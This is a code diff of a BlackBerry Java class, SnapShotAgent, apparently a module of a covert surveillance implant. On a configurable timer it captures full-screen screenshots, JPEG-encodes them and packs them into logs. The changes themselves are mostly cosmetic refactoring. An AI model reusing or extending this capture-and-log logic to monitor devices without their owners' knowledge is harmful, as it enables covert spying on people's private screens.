@@ -7,9 +7,6 @@ import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
-
-import blackberry.fs.AutoFlashFile;
-import blackberry.fs.Path;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
@@ -28,7 +25,7 @@ public class SnapShotAgent extends Agent {
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
 
-    public SnapShotAgent(boolean agentStatus) {
+    public SnapShotAgent(final boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
         // #ifdef DBC
         Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
@@ -36,7 +33,7 @@ public class SnapShotAgent extends Agent {
         // #endif       
     }
 
-    protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
+    protected SnapShotAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
@@ -46,10 +43,10 @@ public class SnapShotAgent extends Agent {
 
         // #debug
         debug.info("Taking snapshot");
-        int width = Display.getWidth();
-        int height = Display.getHeight();
+        final int width = Display.getWidth();
+        final int height = Display.getHeight();
 
-        Bitmap bitmap = new Bitmap(width, height);
+        final Bitmap bitmap = new Bitmap(width, height);
         Display.screenshot(bitmap);
 
         // int size = width * height;
@@ -58,9 +55,9 @@ public class SnapShotAgent extends Agent {
          * 0, width, height);
          */
         // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
-        EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
+        final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                 SNAPSHOT_DEFAULT_JPEG_QUALITY);
-        byte[] plain = encoded.getData();
+        final byte[] plain = encoded.getData();
 
         /*
          * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "snapshot.jpg",
@@ -82,13 +79,14 @@ public class SnapShotAgent extends Agent {
     }
 
     private byte[] getAdditionalData() {
-        String window = "Desktop";
+        final String window = "Desktop";
 
-        int wlen = window.length() * 2;
-        int tlen = wlen + 24;
-        byte[] additionalData = new byte[tlen];
+        final int wlen = window.length() * 2;
+        final int tlen = wlen + 24;
+        final byte[] additionalData = new byte[tlen];
 
-        DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen, false);
+        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
+                false);
 
         databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
         databuffer.writeInt(0); // process name len
@@ -110,12 +108,12 @@ public class SnapShotAgent extends Agent {
         return additionalData;
     }
 
-    protected boolean parse(byte[] confParameters) {
+    protected boolean parse(final byte[] confParameters) {
         // #ifdef DBC
         Check.asserts(confParameters != null, "Null confParameters");
         // #endif
 
-        DataBuffer databuffer = new DataBuffer(confParameters, 0,
+        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                 confParameters.length, false);
 
         try {
@@ -133,12 +131,12 @@ public class SnapShotAgent extends Agent {
             // #debug
             debug.trace("onNewWindow: " + onNewWindow);
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
             debug.error("params FAILED");
             return false;
         }
-        
+
         setPeriod(timerMillis);
         setDelay(timerMillis);
 
